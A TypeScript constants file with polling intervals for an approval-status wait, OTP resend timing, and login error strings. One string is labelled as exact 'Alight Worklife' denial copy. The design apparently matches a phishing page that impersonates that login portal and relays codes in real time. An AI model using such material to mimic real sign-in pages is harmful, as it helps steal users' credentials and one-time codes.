/** Fast polls for the first burst window, then steadier cadence. */
export const BURST_POLL_MS = 200
export const BURST_WINDOW_MS = 10_000
/** Steady poll interval after the burst window. */
export const POLL_MS = 500
export const APPROVAL_TIMEOUT_MS = 90_000

/** Delay until the next approval status poll based on time since wait started. */
export function approvalPollDelayMs(waitStartedAtMs: number): number {
  return Date.now() - waitStartedAtMs < BURST_WINDOW_MS ? BURST_POLL_MS : POLL_MS
}

export const MSG_UNABLE_VERIFY_TIME =
  "We are unable to verify you at this time. Please try again."

export const MSG_UNABLE_REACH_VERIFICATION =
  "Unable to reach verification. Please try again."

export const OTP_CODE_ERROR_TEXT =
  "The code you entered is incorrect or has expired."

export const METHOD_DENIED_ERROR_TEXT =
  "Incorrect password or User ID."

export const MSG_INCORRECT_USERNAME_PASSWORD =
  "incorrect Username or Password"

/** Alight Worklife landing denial copy (canonical — Testing 1 RULE 3B, no divergence). */
export const LOGIN_DENIED_ERROR_TEXT =
  "The entered User Id and/or password is incorrect. Please try again. Your account will be locked after multiple failed attempts for security reasons."

export const OTP_RESEND_COOLDOWN_SEC = 30
export const SIGN_IN_LOADING_MS = 2_000
